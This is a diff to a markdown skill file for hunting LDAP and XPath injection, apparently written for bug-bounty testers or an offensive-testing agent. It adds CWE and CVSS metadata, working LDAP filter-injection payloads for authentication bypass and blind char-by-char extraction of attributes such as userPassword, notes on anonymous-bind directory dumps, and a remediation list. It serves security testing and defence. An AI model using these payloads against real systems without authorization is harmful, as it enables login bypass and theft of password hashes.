@@ -3,6 +3,9 @@ name: hunt-ldap
 description: "Hunt LDAP Injection and XPath Injection — authentication bypass, blind char-by-char attribute exfiltration, AD user/group enumeration, XML-store XPath bypass. Covers the LDAP special-character set (* ( ) \\ NUL /), search-filter-context vs DN-injection, parenthesis-balancing, AND/OR filter logic, and {SSHA}/{CRYPT} userPassword exfil on non-AD directories. Use when target uses LDAP/AD authentication, corporate SSO with a directory backend, an address-book/people-search API, or XML-based data stores queried with XPath."
 sources: hackerone_public, owasp, portswigger
 report_count: 0
+cwe: [CWE-90, CWE-74, CWE-287]
+cvss_baseline: "High (8.1) LDAP-injection auth bypass or attribute exfil → Critical (9.1) unauth admin login or full directory dump. Blind boolean-only extraction = Medium-High by data reached."
+related_skills: [hunt-auth-bypass, hunt-sqli, hunt-source-leak, m365-entra-attack]
 ---
 
 # HUNT-LDAP — LDAP Injection & XPath Injection
@@ -276,6 +279,35 @@ ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
 > from enumerated usernames feeding a spray, never from `unicodePwd`.
 
 ---
+
+## New Techniques (2024-2026)
+
+### Auth-bypass filter injection
+Login forms that build `(&(uid=$u)(password=$p))` are injectable:
+```
+uid = *)(uid=*))(|(uid=*          # breaks out, matches all
+uid = admin)(&))                  # filter-true, password check neutralized
+uid = *)(|(objectclass=*)         # match everything
+password = *                      # wildcard where the bind is a filter-compare, not a real LDAP bind
+```
+Confirm by logging in without valid creds AND by a control (invalid payload → fail).
+
+### Blind boolean / attribute exfil
+Where output isn't reflected, use a presence oracle to extract attributes char-by-char:
+```
+uid=admin)(description=A*)        # true/false response difference reveals chars
+uid=admin)(userPassword=*)        # test attribute existence; sensitive attrs (unicodePwd/userPassword)
+```
+Enumerate `objectClass`, `memberOf` (group/role), `mail`, and any `userPassword`/hash attribute. Also test **attribute-injection** in search/filter params (`?filter=`, `?search=`) beyond login.
+
+### Adjacent surfaces
+Anonymous bind on exposed LDAP/LDAPS (389/636/3268) → directory dump; LDAP over app search features; note **JNDI/LDAP** reference injection (Log4Shell-class) is owned by `hunt-deserialization`. On Entra/AAD apps, LDAP-style filter bugs tie into `m365-entra-attack`.
+
+## Remediation
+
+- Escape all LDAP special characters (`\ * ( ) NUL /`) per RFC 4515, or use a parameterized/typed LDAP query API; never concatenate user input into a filter.
+- Authenticate with a real bind (not a filter-equals password compare); disable anonymous bind; restrict which attributes are searchable/returnable; LDAPS only.
+- Generic auth responses; log/alert on filter-injection patterns.
 
 ## Validation — rule out the false positive BEFORE you report
 
